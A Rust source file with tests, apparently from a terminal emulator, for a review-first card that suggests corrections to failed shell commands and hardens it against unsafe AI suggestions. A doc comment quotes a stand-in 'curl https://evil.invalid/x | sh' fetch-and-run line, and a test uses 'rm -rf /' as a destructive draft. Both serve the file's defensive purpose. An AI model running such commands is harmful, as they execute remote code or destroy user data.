//! Review-first correction for narrowly classified failed commands: ember's
//! egui surface over the shared `jterm_core::command_correction` engine.
//!
//! Ember used to carry its own port of anvil's engine — classification, token
//! extraction, ranking, the safety gate, the prompt, the reply parser, the
//! helper-trust predicate, the probe layer and the request epoch machine, none
//! of which mention egui. All four family terminals carried that same engine
//! and all four drifted in both directions, so no copy was correct on its own.
//! Their union now lives in the core and ember keeps only this shim: the
//! floating card, its focus and arming rules, and the effect the app applies to
//! the PTY.
//!
//! The core is stricter than ember's port was, and adopting it is the point of
//! the migration:
//!
//! - A candidate may no longer append `| sh` to a command that already
//!   contained a pipe. `syntax_markers` asks only whether a marker is
//!   *present*, so ember's superset check saw no new marker there and offered
//!   `curl https://evil.invalid/x | sh` pre-filled in an auto-focused field.
//! - Helper resolution uses `jterm_core::helper`'s trust predicate. Ember's
//!   hand-rolled `owner == euid || mode & 0o022 != 0` trusted a *third* user's
//!   binary found on PATH — automatic code execution on a shared machine, fired
//!   by any failed command — and refused every system helper when ember itself
//!   runs as root, silently killing APT evidence in containers.
//! - The card renders only pre-sanitised display strings. Ember interpolated
//!   the provider's `message` raw into a label directly above an editable,
//!   pre-filled command field, so a bidi override could reverse the rendered
//!   order of the text beside it, and showed no destructive-risk label at all
//!   even though its own Agent card has run `is_dangerous` all along.
//! - A completion the shell did not itself report no longer raises a card.
//!   Ember's execution journal, its Agent panel and even its long-command toast
//!   all refuse an untrusted completion; only this surface accepted one, and a
//!   boundary-inferred block attributes stale scrollback and a guessed status to
//!   a command that may well have succeeded.
//!
//! What ember contributed to the union is the consent gate: it was the only
//! copy that honoured `ai_share_command_context` before shipping the failed
//! command, the working directory and up to 8 KiB of terminal output to the
//! provider. That is now `ContextSharing`, stated at construction, with no
//! `Default` and a `ConsentProof` the payload builder demands.
//!
//! ember deviations that remain, all app-shaped:
//!
//! - The card is a floating egui window above the active session (ember has no
//!   inline-notice surface inside the terminal canvas), rendered only while the
//!   originating session is active.
//! - ember has no remote terminal sessions, so `remote` is always false.
//! - No settings env override: ember's config file is the single source of
//!   truth (anvil's `ANVIL_COMMAND_CORRECTION_ENABLED` has no ember analog),
//!   and ember has no `--safe-mode` launch flag to suppress the surface with.

use std::collections::HashMap;
use std::sync::mpsc;
use std::time::{Duration, Instant};

use jterm_core::ai::AiCancellationToken;
use jterm_core::command_correction::{
    correction_monitor_enabled, request_timed_out, resolve_correction_blocking, should_start,
    CompletionFacts, ContextSharing, CorrectionCandidate, CorrectionPolicy, CorrectionProposal,
    CorrectionRequestState, HelperStrategy, LocalEvidence, CORRECTION_REQUEST_TIMEOUT,
};

use crate::config::Config;
use crate::terminal::CompletedCommandEvent;
use crate::theme::ThemeExt as _;

/// Names the probe's stdout reader thread so a stuck reader is attributable to
/// ember in `ps`/`gdb`.
const PROBE_THREAD_NAME: &str = "ember-command-correction-probe";

/// Ember's answer to every question the engine refuses to ask the environment
/// behind the caller's back.
///
/// Built per request rather than once at startup because the consent switch is
/// a live config value; the `PATH` split is the only allocation.
fn correction_policy(config: &Config) -> CorrectionPolicy {
    CorrectionPolicy::new(
        // Ember owns its PTYs: the failed command resolved against *this*
        // process's namespace, so this process's PATH is evidence about it and
        // a helper resolved from it is the same binary the shell would have
        // run. Ember's copy asked `jterm_core::host::is_flatpak()` here — the
        // only occurrence of that symbol anywhere in ember, inherited from
        // anvil, and inverted: ember has no sandbox packaging and no host
        // bridge, so the check could only ever be dead, and had ember ever been
        // sandboxed it would have suppressed exactly the enumeration that would
        // then have been correct.
        LocalEvidence::SameNamespace {
            search_path: std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default())
                .collect(),
            // Ember has always scanned PATH for its helpers, and keeping that
            // is what preserves APT and `compgen` evidence on a host whose
            // system helpers are not under `/usr/bin`. The hole was never the
            // scan, it was the hand-rolled predicate; `TrustedPathScan` runs
            // the same fixed candidates first and then the absolute PATH
            // entries under `jterm_core::helper`'s predicate.
            helpers: HelperStrategy::TrustedPathScan,
        },
        context_sharing(config),
        PROBE_THREAD_NAME,
    )
}

/// Whether this failure's command, cwd and output may leave the machine.
///
/// The payload of the AI fallback is exactly command/cwd/output, which is what
/// `ai_share_command_context` is described in ember's own settings as consenting
/// to (a directly-configured loopback Ollama endpoint satisfies it without the
/// switch, since nothing leaves the host). Local verified evidence never leaves
/// the machine and runs either way.
fn context_sharing(config: &Config) -> ContextSharing {
    match crate::agent_panel::ensure_semantic_context_sharing_allowed(config) {
        Ok(()) => ContextSharing::Consented,
        Err(_) => ContextSharing::Withheld,
    }
}

struct CorrectionCard {
    generation: u64,
    /// The engine's proposal plus the live edit buffer and inline feedback.
    /// Every string a card may render comes from here already sanitised.
    proposal: CorrectionProposal,
    /// A card created during this OS input batch must not consume the same
    /// batch's trailing Enter/Escape/click as approval. Its first render only
    /// presents the proposal and arms decisions for the following frame (same
    /// rule as the paste-confirmation dialog).
    armed: bool,
    focus_pending: bool,
    /// Bounds the initial focus retry: a shell that redraws its prompt late
    /// gets the card focused once the prompt is clean and idle, but a user who
    /// went back to typing is never surprised by a focus steal seconds later.
    focus_deadline: Instant,
}

#[derive(Default)]
struct SessionCorrection {
    request_state: CorrectionRequestState,
    generation: u64,
    started: Option<Instant>,
    reply_rx: Option<mpsc::Receiver<Result<Option<CorrectionCandidate>, String>>>,
    original_command: String,
    exit_code: i32,
    card: Option<CorrectionCard>,
}

/// An accepted review decision for the app to apply to the PTY. `run` is true
/// only for an unchanged, verified, non-dangerous candidate.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct CorrectionEffect {
    pub(crate) session_id: String,
    pub(crate) generation: u64,
    pub(crate) command: String,
    pub(crate) run: bool,
}

#[derive(Debug, PartialEq, Eq)]
pub(crate) enum CorrectionUiOutcome {
    None,
    Accepted(CorrectionEffect),
}

/// Review-first command correction monitor. Owns at most one request/card per
/// terminal session, keyed by stable session ID so tab/pane index drift can
/// never present a proposal against the wrong prompt.
#[derive(Default)]
pub(crate) struct CorrectionMonitor {
    sessions: HashMap<String, SessionCorrection>,
}

impl CorrectionMonitor {
    /// Feed one OSC 133 command completion. Any finished command retires the
    /// session's older card and in-flight request before this failure is
    /// classified (family parity: a late result must never present against the
    /// wrong prompt).
    pub(crate) fn handle_completed(
        &mut self,
        config: &Config,
        agent_active: bool,
        session_id: &str,
        completed: &CompletedCommandEvent,
    ) {
        let entry = self.sessions.entry(session_id.to_string()).or_default();
        entry.card = None;
        let generation = entry.request_state.advance();
        entry.generation = generation;
        entry.reply_rx = None;
        entry.started = None;

        // A completion whose command text the shell never reported cannot be
        // corrected, and skipping it here also avoids cloning up to
        // `MAX_COMPLETED_COMMAND_OUTPUT_BYTES` of output for the engine to
        // decline on.
        let Some(command) = completed.command.clone() else {
            return;
        };
        let enabled = correction_monitor_enabled(
            config.ai_enabled,
            config.command_correction_enabled,
            agent_active,
        );
        let Some(request) = should_start(
            enabled,
            CompletionFacts {
                command,
                exit_code: completed.exit_code,
                // Whole, not pre-sampled: the engine owns the head/tail bound,
                // and sampling twice elides real content out of the middle of
                // the first sample.
                output: completed.output.clone(),
                cwd: completed.cwd.clone(),
                // Ember sessions are local PTYs; there is no remote terminal
                // backend whose cwd namespace would disqualify local evidence.
                remote: false,
                // Commands the Agent itself armed already had their review: the
                // user approved them on the Agent card.
                agent_issued: completed.agent_generation.is_some(),
                trusted_completion: completed.is_trusted_completion(),
            },
        ) else {
            return;
        };

        let policy = correction_policy(config);
        // A missing credential disables only the AI fallback, and withheld
        // consent is the policy's business, not this call's: verified local
        // correction stays available either way and never leaves the machine.
        let client = crate::agent_panel::client_from_config(config).ok();
        let cancellation = AiCancellationToken::new();
        if !entry.request_state.start(generation, cancellation.clone()) {
            return;
        }
        let deadline = Instant::now() + CORRECTION_REQUEST_TIMEOUT;
        let (tx, rx) = mpsc::sync_channel(1);
        let original_command = request.command().to_string();
        let exit_code = request.exit_code();
        let worker = std::thread::Builder::new()
            .name("ember-command-correction".to_string())
            .spawn(move || {
                let result = resolve_correction_blocking(
                    &policy,
                    &request,
                    client.as_ref(),
                    &cancellation,
                    deadline,
                );
                let _ = tx.send(result);
            });
        match worker {
            Ok(_) => {
                entry.original_command = original_command;
                entry.exit_code = exit_code;
                entry.reply_rx = Some(rx);
                entry.started = Some(Instant::now());
            }
            Err(error) => {
                entry.request_state.finish(generation);
                log::warn!("could not start command correction worker: {error}");
            }
        }
    }

    /// Per-frame driver: harvest worker replies, enforce the shared deadline,
    /// and cancel everything when the feature or the whole AI surface has
    /// been turned off (or the Agent panel took over a prompt) since the
    /// request started.
    pub(crate) fn drive(&mut self, config: &Config, agent_active: bool, ctx: &egui::Context) {
        let enabled = correction_monitor_enabled(
            config.ai_enabled,
            config.command_correction_enabled,
            agent_active,
        );
        let mut resolving = false;
        let mut drained = Vec::new();
        for (session_id, entry) in self.sessions.iter_mut() {
            if !enabled {
                entry.request_state.cancel(entry.generation);
                entry.reply_rx = None;
                entry.started = None;
                entry.card = None;
            } else if entry.reply_rx.is_some() {
                let generation = entry.generation;
                let timed_out = entry.started.is_some_and(|started| {
                    request_timed_out(started, Instant::now(), CORRECTION_REQUEST_TIMEOUT)
                });
                if timed_out {
                    entry.request_state.cancel(generation);
                    entry.reply_rx = None;
                    entry.started = None;
                    log::warn!(
                        "command correction timed out after {} seconds",
                        CORRECTION_REQUEST_TIMEOUT.as_secs()
                    );
                } else {
                    let reply = entry.reply_rx.as_ref().map(|rx| rx.try_recv());
                    match reply {
                        Some(Ok(Ok(Some(candidate)))) => {
                            entry.reply_rx = None;
                            entry.started = None;
                            if entry.request_state.finish(generation) {
                                entry.card = Some(CorrectionCard {
                                    generation,
                                    proposal: CorrectionProposal::new(candidate),
                                    armed: false,
                                    focus_pending: true,
                                    focus_deadline: Instant::now() + Duration::from_secs(2),
                                });
                            }
                        }
                        Some(Ok(Ok(None))) => {
                            entry.request_state.finish(generation);
                            entry.reply_rx = None;
                            entry.started = None;
                        }
                        Some(Ok(Err(error))) => {
                            entry.request_state.finish(generation);
                            entry.reply_rx = None;
                            entry.started = None;
                            log::debug!("command correction produced no safe candidate: {error}");
                        }
                        Some(Err(mpsc::TryRecvError::Empty)) => {}
                        Some(Err(mpsc::TryRecvError::Disconnected)) => {
                            entry.request_state.finish(generation);
                            entry.reply_rx = None;
                            entry.started = None;
                            log::warn!("command correction worker disconnected");
                        }
                        None => {
                            entry.reply_rx = None;
                            entry.started = None;
                        }
                    }
                }
            }
            resolving |= entry.reply_rx.is_some();
            if entry.reply_rx.is_none() && entry.card.is_none() {
                drained.push(session_id.clone());
            }
        }
        for session_id in drained {
            self.sessions.remove(&session_id);
        }
        if resolving {
            // A worker finishes without producing an egui event; keep ticking
            // so the card appears promptly (same pattern as the Agent panel).
            ctx.request_repaint_after(Duration::from_millis(50));
        }
    }

    /// Render the review card for the active session, if one is presented.
    /// `prompt_clean_idle` gates the initial keyboard focus grab: a prompt the
    /// user is already typing into must keep its keystrokes.
    pub(crate) fn show(
        &mut self,
        ctx: &egui::Context,
        theme: &crate::theme::Theme,
        active_session_id: Option<&str>,
        prompt_clean_idle: bool,
    ) -> CorrectionUiOutcome {
        let Some(session_id) = active_session_id else {
            return CorrectionUiOutcome::None;
        };
        let Some(entry) = self.sessions.get_mut(session_id) else {
            return CorrectionUiOutcome::None;
        };
        if entry.card.is_none() {
            return CorrectionUiOutcome::None;
        }
        let generation = entry.card.as_ref().map(|card| card.generation).unwrap_or(0);
        let exit_code = entry.exit_code;
        let original_command = entry.original_command.clone();

        let mut open = true;
        let mut accept = false;
        let mut dismiss = false;
        let card = entry.card.as_mut().expect("card checked above");

        egui::Window::new(card.proposal.candidate().display_title())
            .id(egui::Id::new(("command-correction", session_id)))
            .open(&mut open)
            .collapsible(false)
            .resizable(false)
            .default_width(560.0)
            .anchor(egui::Align2::CENTER_BOTTOM, egui::vec2(0.0, -24.0))
            .frame(egui::Frame {
                fill: crate::theme::Theme::rgb_to_color32(theme.ui.panel_bg),
                stroke: egui::Stroke::new(
                    1.0,
                    crate::theme::Theme::rgb_to_color32(theme.ui.border),
                ),
                corner_radius: egui::CornerRadius::same(10),
                inner_margin: egui::Margin::same(8),
                ..Default::default()
            })
            .show(ctx, |ui| {
                ui.label(
                    egui::RichText::new(card.proposal.candidate().display_badge(exit_code))
                        .weak()
                        .small(),
                );
                // Both halves are pre-sanitised by the engine: the model's
                // prose is collapsed to one display line with spoofing replaced
                // at candidate construction, and the failed command is bounded
                // to a preview. Ember used to interpolate the raw message here.
                ui.label(
                    card.proposal
                        .candidate()
                        .display_description(&original_command),
                );
                let edit_response = ui.add(
                    egui::TextEdit::singleline(card.proposal.draft_mut())
                        .font(egui::TextStyle::Monospace)
                        .desired_width(f32::INFINITY),
                );
                if card.focus_pending {
                    // The shell may redraw its fresh prompt a frame or two
                    // after the completion event that presented this card.
                    // Retry briefly, but only ever take focus from a clean,
                    // idle prompt — a prompt the user is already typing into
                    // keeps its keystrokes — and never beyond the deadline.
                    if prompt_clean_idle {
                        edit_response.request_focus();
                    }
                    if edit_response.has_focus() || Instant::now() >= card.focus_deadline {
                        card.focus_pending = false;
                    }
                }
                // `is_dangerous` never decides whether a candidate is *offered*
                // — it gates only the direct-run decision, whose verified
                // conjunct is false for every AI and target-output proposal —
                // so a destructive proposal always reaches this card. Ember
                // rendered `rm -rf ~/work` in exactly the chrome it gave
                // `git status`, while its own Agent card has flagged the same
                // thing all along. Recomputed after the edit, so a draft the
                // user made destructive is labelled on the same frame.
                if let Some(reason) = card.proposal.risk() {
                    ui.colored_label(
                        ui.visuals().error_fg_color,
                        format!("⚠ destructive: {reason}"),
                    );
                }
                if let Some(feedback) = card.proposal.feedback() {
                    ui.colored_label(ui.visuals().error_fg_color, feedback);
                }
                ui.horizontal(|ui| {
                    // Asked after this frame's edit was applied, so the label
                    // and the action it triggers cannot disagree: any edit
                    // downgrades a verified proposal to insert-only.
                    let primary_label = if card.proposal.run_allowed() {
                        "Run verified command"
                    } else {
                        "Insert for review"
                    };
                    if ui.button(primary_label).clicked() {
                        accept = true;
                    }
                    if ui.button("Dismiss").clicked() {
                        dismiss = true;
                    }
                });
                // The edit field owns Enter/Escape while focused, and a focused
                // text edit already blocks terminal input routing, so neither
                // key can leak into the PTY underneath. egui's singleline edit
                // surrenders focus when it sees Enter/Escape, so the decision
                // must accept both the focused and the just-lost-focus state.
                if card.armed {
                    let enter_pressed = ui.input(|input| input.key_pressed(egui::Key::Enter));
                    let escape_pressed = ui.input(|input| input.key_pressed(egui::Key::Escape));
                    let edit_owned_key = edit_response.has_focus() || edit_response.lost_focus();
                    if enter_pressed && edit_owned_key {
                        accept = true;
                    }
                    if escape_pressed && edit_owned_key {
                        dismiss = true;
                    }
                }
                card.armed = true;
            });

        if entry.card.as_ref().is_some_and(|card| card.focus_pending) {
            // The bounded focus retry needs frames while the shell finishes
            // its prompt redraw.
            ctx.request_repaint_after(Duration::from_millis(50));
        }
        if !open {
            dismiss = true;
        }
        if dismiss {
            entry.request_state.retire(generation);
            entry.card = None;
            return CorrectionUiOutcome::None;
        }
        if accept {
            let card = entry.card.as_mut().expect("card present until accept");
            // The user may have edited the candidate: re-validate against this
            // surface's own 16 KiB budget and take the run-versus-insert
            // decision from the same validated string, so the button's label
            // and what the app does with the effect can never diverge.
            let accepted = match card.proposal.accept() {
                Ok(accepted) => accepted,
                Err(error) => {
                    card.proposal
                        .set_feedback(Some(format!("Cannot accept correction: {error}")));
                    return CorrectionUiOutcome::None;
                }
            };
            card.proposal.set_feedback(None);
            // A newer completion observed between render and click retires the
            // epoch; never emit an effect for a stale generation.
            if !entry.request_state.is_generation(generation) {
                entry.card = None;
                return CorrectionUiOutcome::None;
            }
            return CorrectionUiOutcome::Accepted(CorrectionEffect {
                session_id: session_id.to_string(),
                generation,
                command: accepted.command,
                run: accepted.run_directly,
            });
        }
        CorrectionUiOutcome::None
    }

    /// Settle an accepted effect after the app tried to write it to the PTY.
    /// Success retires the generation (so it can never execute twice) and
    /// closes the card; failure keeps the card and shows the reason inline,
    /// matching the sources' in-card feedback.
    pub(crate) fn complete_accept(
        &mut self,
        session_id: &str,
        generation: u64,
        result: Result<(), String>,
    ) {
        let Some(entry) = self.sessions.get_mut(session_id) else {
            return;
        };
        let Some(card) = entry.card.as_mut() else {
            return;
        };
        if card.generation != generation {
            return;
        }
        match result {
            Ok(()) => {
                entry.request_state.retire(generation);
                entry.card = None;
            }
            Err(error) => {
                card.proposal.set_feedback(Some(error));
            }
        }
    }

    /// Drop all state for a closed session; the request-state drop cancels any
    /// in-flight worker so it cannot present against a recycled session ID.
    pub(crate) fn remove_session(&mut self, session_id: &str) {
        self.sessions.remove(session_id);
    }

    #[cfg(test)]
    pub(crate) fn presented_command(&self, session_id: &str) -> Option<&str> {
        self.sessions
            .get(session_id)
            .and_then(|entry| entry.card.as_ref())
            .map(|card| card.proposal.candidate().command())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use jterm_core::block_contract::CompletionProvenance;

    fn completed_event(
        command: &str,
        exit_code: Option<i32>,
        output: &str,
        agent_generation: Option<u64>,
    ) -> CompletedCommandEvent {
        event_with_provenance(
            command,
            exit_code,
            output,
            agent_generation,
            CompletionProvenance::ShellReported,
        )
    }

    fn event_with_provenance(
        command: &str,
        exit_code: Option<i32>,
        output: &str,
        agent_generation: Option<u64>,
        completion_provenance: CompletionProvenance,
    ) -> CompletedCommandEvent {
        CompletedCommandEvent {
            completed: crate::terminal::CompletedCommandOutput {
                id: "exec-1".to_string(),
                command: Some(command.to_string()),
                cwd: Some("/tmp".to_string()),
                exit_code,
                duration_ms: Some(5),
                output: output.to_string(),
                output_available: true,
                truncated: false,
                total_bytes: output.len(),
                agent_generation,
            },
            start_mark_seen: true,
            completion_provenance,
        }
    }

    fn enabled_config() -> Config {
        Config {
            ai_enabled: true,
            command_correction_enabled: true,
            ..Config::default()
        }
    }

    fn drive_until_presented(monitor: &mut CorrectionMonitor, session_id: &str) {
        let ctx = egui::Context::default();
        let deadline = Instant::now() + Duration::from_secs(5);
        loop {
            monitor.drive(&enabled_config(), false, &ctx);
            if monitor.presented_command(session_id).is_some() {
                return;
            }
            assert!(Instant::now() < deadline, "correction worker never replied");
            std::thread::sleep(Duration::from_millis(10));
        }
    }

    #[test]
    fn ember_states_its_correction_policy_explicitly() {
        // The engine refuses to probe the environment behind the caller's
        // back, so every one of these is ember's answer and nobody else's.
        // Pin them: each was a family divergence, and each failure mode is
        // silent.
        let mut config = enabled_config();
        let policy = correction_policy(&config);
        match policy.evidence() {
            LocalEvidence::SameNamespace {
                search_path,
                helpers,
            } => {
                // Ember runs local PTYs and has no host bridge, so this
                // process's PATH really is evidence about the failed command.
                // The old copy's `is_flatpak()` suppression was the only use of
                // that symbol in all of ember.
                assert_eq!(*helpers, HelperStrategy::TrustedPathScan);
                assert_eq!(
                    search_path,
                    &std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default())
                        .collect::<Vec<_>>()
                );
            }
            other => panic!("ember owns its PTYs; evidence must be local: {other:?}"),
        }
        // The switch ember was the only app to honour here, and which the
        // engine now demands a `ConsentProof` for. Default off means the AI
        // fallback stays silent while local verified corrections keep working.
        assert!(!config.ai_share_command_context);
        assert_eq!(policy.context_sharing(), ContextSharing::Withheld);
        assert!(
            policy.consent().is_none(),
            "withheld consent must not yield a payload witness"
        );

        config.ai_share_command_context = true;
        let consented = correction_policy(&config);
        assert_eq!(consented.context_sharing(), ContextSharing::Consented);
        assert!(consented.consent().is_some());
    }

    #[test]
    fn disabled_monitor_and_agent_executions_never_start_a_request() {
        let idle = |monitor: &CorrectionMonitor| {
            monitor
                .sessions
                .get("session-a")
                .is_none_or(|entry| entry.reply_rx.is_none() && entry.card.is_none())
        };
        let event = completed_event(
            "git statsu",
            Some(1),
            "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus",
            None,
        );

        let mut monitor = CorrectionMonitor::default();
        monitor.handle_completed(&Config::default(), false, "session-a", &event);
        assert!(idle(&monitor), "the correction toggle defaults off");

        let mut monitor = CorrectionMonitor::default();
        monitor.handle_completed(&enabled_config(), true, "session-a", &event);
        assert!(idle(&monitor), "an active Agent session owns the prompt");

        let mut monitor = CorrectionMonitor::default();
        let agent_event = completed_event("git statsu", Some(1), "command not found", Some(7));
        monitor.handle_completed(&enabled_config(), false, "session-a", &agent_event);
        assert!(
            idle(&monitor),
            "the Agent's own commands were already reviewed"
        );

        // No reported exit status is not a failure signal.
        let mut monitor = CorrectionMonitor::default();
        let unknown = completed_event("git statsu", None, "command not found", None);
        monitor.handle_completed(&enabled_config(), false, "session-a", &unknown);
        assert!(idle(&monitor), "no reported status is not a failure signal");
    }

    #[test]
    fn only_a_shell_reported_completion_can_raise_a_card() {
        // Ember's execution journal, its Agent panel and even its long-command
        // toast all refuse an untrusted completion; this surface used to accept
        // one, so a block a later prompt forced shut attributed the *previous*
        // command's scrollback and a guessed status to this command, and the
        // whole request, prompt and card were built on that misattribution.
        let output = "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus";
        for provenance in [
            CompletionProvenance::BoundaryInferred,
            CompletionProvenance::Unknown,
        ] {
            let mut monitor = CorrectionMonitor::default();
            let event = event_with_provenance("git statsu", Some(1), output, None, provenance);
            assert!(
                !event.is_trusted_completion(),
                "{provenance:?} is not a shell-reported status"
            );
            monitor.handle_completed(&enabled_config(), false, "session-a", &event);
            assert!(
                monitor
                    .sessions
                    .get("session-a")
                    .is_none_or(|entry| entry.reply_rx.is_none() && entry.card.is_none()),
                "{provenance:?} must not raise a correction"
            );
        }

        // The same failure, reported by the shell itself, still does.
        let mut monitor = CorrectionMonitor::default();
        monitor.handle_completed(
            &enabled_config(),
            false,
            "session-a",
            &completed_event("git statsu", Some(1), output, None),
        );
        assert!(monitor.sessions["session-a"].reply_rx.is_some());
    }

    #[test]
    fn target_suggestion_flows_from_completion_to_presented_card() {
        let mut monitor = CorrectionMonitor::default();
        let event = completed_event(
            "git statsu --short",
            Some(1),
            "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus",
            None,
        );
        monitor.handle_completed(&enabled_config(), false, "session-a", &event);
        assert!(monitor.sessions["session-a"].reply_rx.is_some());

        drive_until_presented(&mut monitor, "session-a");
        assert_eq!(
            monitor.presented_command("session-a"),
            Some("git status --short")
        );

        // A newer completion in the same session retires the presented card.
        let next = completed_event("ls", Some(0), "", None);
        monitor.handle_completed(&enabled_config(), false, "session-a", &next);
        assert!(monitor.presented_command("session-a").is_none());
    }

    #[test]
    fn the_card_reads_only_engine_sanitised_text_and_labels_a_destructive_draft() {
        let mut monitor = CorrectionMonitor::default();
        monitor.handle_completed(
            &enabled_config(),
            false,
            "session-a",
            &completed_event(
                "git statsu",
                Some(1),
                "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus",
                None,
            ),
        );
        drive_until_presented(&mut monitor, "session-a");
        let card = monitor
            .sessions
            .get_mut("session-a")
            .and_then(|entry| entry.card.as_mut())
            .expect("presented");

        // Every text slot on the card comes from the engine's display
        // accessors, which are the only strings a `CorrectionCandidate` will
        // hand out — it keeps no raw model prose at all. Ember used to
        // interpolate the provider's `message` straight into this label, one
        // line above the pre-filled, auto-focused field below.
        let candidate = card.proposal.candidate();
        assert_eq!(
            candidate.display_title(),
            "The command suggested a correction"
        );
        assert_eq!(
            candidate.display_badge(1),
            "exit 1 · Suggested by target output; not independently verified"
        );
        assert!(candidate
            .display_description("git statsu")
            .ends_with("\nFailed command: git statsu"));

        // Unverified evidence is insert-only, and a clean draft carries no
        // destructive label.
        assert!(!card.proposal.run_allowed());
        assert!(card.proposal.risk().is_none());

        // Ember's card showed no risk indication at all: `rm -rf /` rendered in
        // exactly the chrome `git status` got, in a field where Enter accepts.
        card.proposal.draft_mut().clear();
        card.proposal.draft_mut().push_str("rm -rf /");
        assert!(
            card.proposal.risk().is_some(),
            "a destructive draft must be labelled on the card"
        );
    }

    #[test]
    fn failed_apply_keeps_the_card_and_success_retires_it() {
        let mut monitor = CorrectionMonitor::default();
        let event = completed_event(
            "git statsu",
            Some(1),
            "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus",
            None,
        );
        monitor.handle_completed(&enabled_config(), false, "session-a", &event);
        drive_until_presented(&mut monitor, "session-a");
        let generation = monitor.sessions["session-a"]
            .card
            .as_ref()
            .map(|card| card.generation)
            .expect("presented");

        monitor.complete_accept("session-a", generation, Err("prompt not ready".to_string()));
        assert_eq!(
            monitor.presented_command("session-a"),
            Some("git status"),
            "a failed PTY write must keep the review card open"
        );
        assert_eq!(
            monitor.sessions["session-a"]
                .card
                .as_ref()
                .and_then(|card| card.proposal.feedback()),
            Some("prompt not ready")
        );

        monitor.complete_accept("session-a", generation, Ok(()));
        assert!(monitor.presented_command("session-a").is_none());
        assert!(
            !monitor.sessions["session-a"]
                .request_state
                .is_generation(generation),
            "an accepted generation must never execute twice"
        );
    }

    #[test]
    fn a_disabled_surface_cancels_an_in_flight_request_and_drops_the_session() {
        let mut monitor = CorrectionMonitor::default();
        let event = completed_event(
            "git statsu",
            Some(1),
            "git: 'statsu' is not a git command.\n\nThe most similar command is\n\tstatus",
            None,
        );
        monitor.handle_completed(&enabled_config(), false, "session-a", &event);
        assert!(monitor.sessions["session-a"].reply_rx.is_some());

        // Turning the feature off mid-flight must not leave a worker able to
        // present a card against a prompt the user has moved on from.
        let ctx = egui::Context::default();
        monitor.drive(&Config::default(), false, &ctx);
        assert!(!monitor.sessions.contains_key("session-a"));
    }
}
